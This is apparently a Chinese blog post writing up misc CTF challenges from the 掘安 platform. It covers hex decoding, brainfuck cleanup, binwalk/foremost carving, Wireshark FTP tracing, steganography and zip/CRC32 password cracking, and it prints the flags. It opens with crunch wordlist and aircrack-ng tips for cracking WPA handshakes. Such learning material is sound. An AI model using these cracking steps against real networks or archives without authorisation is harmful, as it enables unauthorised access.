+<h4 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h4><ul>
+<li><p><strong>crunch格式：</strong>crunch min_length max_length str options，</p>
+<p>-c 数字 指定输出文件行数，    -d 数字符号 限制相同元素出现个数，-e 字符串 定义停止生成密码</p>
+<p>-o或者&gt;&gt; 文件名 指定输出文件名称，-p 字符串 排列组合生成字典    -q 文件名 读取文件</p>
+<p><code>crunch 1 8</code> 生成最小1位最大8位，由26小写字母的组合，</p>
+<p><code>crunch 1 6 str</code>由字符串str组成最小1位，最大6位的组合，</p>
+<p>-t：<code>@</code>小写字母，<code>,</code>大写字母，<code>%</code>数字，<code>^</code>常见符号。</p>
+</li>
+<li><p><strong>Aircrack格式：</strong>仅介绍用于密码本破解，因为内容有点多</p>
+<p>-a2握手包，-w指定字典文件（rockyou.txt为自带，使用记得解压）</p>
+</li>
+</ul>
+<h3 id="soeasy"><a href="#soeasy" class="headerlink" title="soeasy"></a>soeasy</h3><p>在这个文件中找到key就可以通关</p>
+<p>放到HxD里面翻了一下就找到了。。。key: HackingLabHdd1b7c2fb3ff3288bffe，然后加上flag没成功，然后去掉就成功了，emmmm丝毫没有成就感。</p>
+<p>一般CTF里面碰到easy之类的都是有点绕要不是半个硬骨头，意外。。。</p>
+<h3 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h3><p>DDCTF2018的经典吐槽对象，掀桌子。</p>
+<p><code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</code></p>
+<p>16进制，len()看到长度为134，偶数，两个一对看ASCII码，基本上都是大于128，掀桌子提示就在这，减去128，然后转为ascii码即可得到结果。python脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = &quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&quot;</span><br><span class="line">i = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">while i &lt; 133:</span><br><span class="line">	num = int(a[i:i+2],16)-128</span><br><span class="line">	flag += chr(num)</span><br><span class="line">	i += 2</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;9af3c9d377b61d269b11337f330c935f&#125;</span><br></pre></td></tr></table></figure>
+<p>换上格式即可。</p>
+<h3 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h3><p>解压，看到misc50，放到HxD，发现是brainfuck加密，推荐这个网站解密<a target="_blank" rel="noopener" href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html，但是存在一个问题，中间空格太多，目的应该就是通过python或者手动方式去掉空格，然后解密。python3脚本如下">http://esoteric.sange.fi/brainfuck/impl/interp/i.html，但是存在一个问题，中间空格太多，目的应该就是通过python或者手动方式去掉空格，然后解密。python3脚本如下</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ab = open(&quot;misc50&quot;,&quot;r+&quot;)</span><br><span class="line">text = ab.read()</span><br><span class="line">print (len(text))</span><br><span class="line">text = &quot;&quot;.join(text.split())</span><br><span class="line">print (len(text))</span><br><span class="line">ab.close()</span><br><span class="line"></span><br><span class="line">ac = open(&quot;1.txt&quot;,&quot;r+&quot;)</span><br><span class="line">ac.write(text)</span><br><span class="line">ac.close()</span><br></pre></td></tr></table></figure>
+<p>得到flag{esolangs_for_fun_and_profit}</p>
+<h3 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h3><p>文件里有flag，找到它</p>
+<p>先放到了HxD全是TCP还有其他的，看了一会没啥有用的，开linux，binwalk分析文件头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJBRI.jpg" alt="3XJBRI.jpg"></p>
+<p>有PDF，foremost分离（没有的下载即可<code>apt-get install foremost</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 文件名</span><br></pre></td></tr></table></figure>
+<p>文件输出到output文件夹内，找到打开pdf即可。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJDzt.jpg" alt="3XJDzt.jpg"></p>
+<h3 id="fftp"><a href="#fftp" class="headerlink" title="fftp"></a>fftp</h3><p>小黑用ftp下载了一个flag.jpg，却没有flag，你帮他找到</p>
+<p>解压后fftp.pcapng，用binwalk能看到JPEG，但是binwalk和foremost分离不出来</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJsQP.jpg" alt="3XJsQP.jpg"></p>
+<p>放到WireShark打开，题目提示ftp，既然没有HTTP就先从FTP找，追踪TCP流，发现FTP基本上都是这种，应该是FTP下载的各种用户信息。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJysf.jpg" alt="3XJysf.jpg"></p>
+<p>看到有FTP-DATA的协议，追踪TCP流，第一个就是下载信息，</p>
+<p>第二个开始Length明显增大，追踪TCP流，对比文件头好像没啥用，搜索flag，得到flag{9XyMzJU8nEo9UgvhLO96ruIf1gmNIQ9t}</p>
+<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p>八位密码，在文档中的图片中找…</p>
+<p>解压，pngdecode.docx文件，然后打开保存360的图片stegsolve翻了翻常规的都没有，又放到了linux用binwalk分析，一堆zip，foremost分离，emmm然后没密码？？？有一个jpg的文件夹被分离了，然后没啥有用的了，另一个zip的文件夹压缩包解压还是这么多，本着试下的态度交了<code>360HA360</code>结果成功了，怀疑自己非正常解。。。</p>
+<h3 id="doll"><a href="#doll" class="headerlink" title="doll"></a>doll</h3><p>解压，发现套娃的含义。。。png图片，HxD和binwalk分析都没有有用的东西，后来看WP才知道是LSB隐写的BGR位，可以参考这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用</a>，虽然是使用，但是介绍了LSB。</p>
+<p>flag{03a253f5-8e93-4533-bcfc-af908830095d}</p>
+<h3 id="Mirror"><a href="#Mirror" class="headerlink" title="Mirror"></a>Mirror</h3><p>反转</p>
+<p>打开压缩包，一个flag.jpg，用HxD打开好像没啥东西，用binwalk测试发现无隐藏文件，返回，看HxD的文件内容，发现%PNG的标识在文件最后而且倒着的。python读取然后重新写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;flag.jpg&#x27;,&#x27;rb&#x27;) as f:</span><br><span class="line"></span><br><span class="line">    with open(&#x27;flag1.jpg&#x27;,&#x27;wb&#x27;) as g:</span><br><span class="line"></span><br><span class="line">        g.write(f.read()[::-1])</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<h3 id="你能看见么"><a href="#你能看见么" class="headerlink" title="你能看见么"></a>你能看见么</h3><p>说实话，这个我没做出来，然后看的WP，发现是盲文，倒是和题目名称对应了。。。</p>
+<h3 id="boooooom"><a href="#boooooom" class="headerlink" title="boooooom"></a>boooooom</h3><p>happy</p>
+<p>解压，需要密码，直接用AZPR破解，结果是3862，看password.py，需要password.zip的内容，破解试了1-5位不太行，试CRC32破解，得到08646247，加到password.py里面然后注释掉前面的语句，得到一串字符<code>95c800c52134a571dfe69114c378e4be</code>，拿到flag.png，放到HxD没问题，改宽高发现一串字符，<code>95c800c52134a571dfe69114c378e4be</code>，但是我并没有提交成功，加了格式也不对，不过会了就行了。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2>
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            notwiner
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>notwiner的小站,notwiner,博客,博客笔记</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/12/03/%E8%BD%AF%E4%BB%B6/">一些软件整理</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/11/30/sqlmap%E5%92%8Csqli-labs/">sqlmap与sqli-labs记录</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/18/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/">sql注入基础</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/08/PHP%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/">PHP学习（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《XSS跨站脚本攻击剖析与防御》读书笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/27/python3%E5%AD%A6%E4%B9%A02/">python3学习（二）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/%E6%9D%82%E8%AE%B0/">杂记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/Burp/">Burpsuite笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/">密码学（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/05/14/python3%E5%AD%A6%E4%B9%A0/">python3学习（一）</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2020/01/29/%E6%8E%98%E5%AE%89%E5%B9%B3%E5%8F%B0Writeup/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/01/29/%E6%8E%98%E5%AE%89%E5%B9%B3%E5%8F%B0Writeup/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/01/29/%E6%8E%98%E5%AE%89%E5%B9%B3%E5%8F%B0Writeup/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Burpsuite/" style="font-size: 14.803668523634734px;" class="tag-cloud-link">Burpsuite</a>
+    
+    <a href="/tags/Git/" style="font-size: 15.038430751546565px;" class="tag-cloud-link">Git</a>
+    
+    <a href="/tags/PHP/" style="font-size: 9.634474012220938px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/sql/" style="font-size: 16.556541456560353px;" class="tag-cloud-link">sql</a>
+    
+    <a href="/tags/XSS/" style="font-size: 11.071725609676879px;" class="tag-cloud-link">XSS</a>
+    
+    <a href="/tags/hexo/" style="font-size: 19.34759810435004px;" class="tag-cloud-link">hexo</a>
+    
+    <a href="/tags/linux/" style="font-size: 16.883912642011435px;" class="tag-cloud-link">linux</a>
+    
+    <a href="/tags/python3/" style="font-size: 16.571920834304933px;" class="tag-cloud-link">python3</a>
+    
+    <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 9.864762078389633px;" class="tag-cloud-link">上传</a>
+    
+    <a href="/tags/sqlmap/" style="font-size: 12.084667836562684px;" class="tag-cloud-link">sqlmap</a>
+    
+    <a href="/tags/wireshark/" style="font-size: 19.351070658109506px;" class="tag-cloud-link">wireshark</a>
+    
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 18.990166631197496px;" class="tag-cloud-link">笔记</a>
+    
+    <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 16.51723625069566px;" class="tag-cloud-link">密码学</a>
+    
+    <a href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" style="font-size: 12.591244091527054px;" class="tag-cloud-link">树莓派</a>
+    
+    <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 18.50961905229861px;" class="tag-cloud-link">编码</a>
+    
+    <a href="/tags/%E6%8E%98%E5%AE%89CTF/" style="font-size: 9.159241580351985px;" class="tag-cloud-link">掘安CTF</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://myau.moe/" target="_blank">gal主题作者</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/wen1ling/" target="_blank">Github</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 notwiner Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true,"width":90,"height":150},"react":{"opacity":0.8}});</script></body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
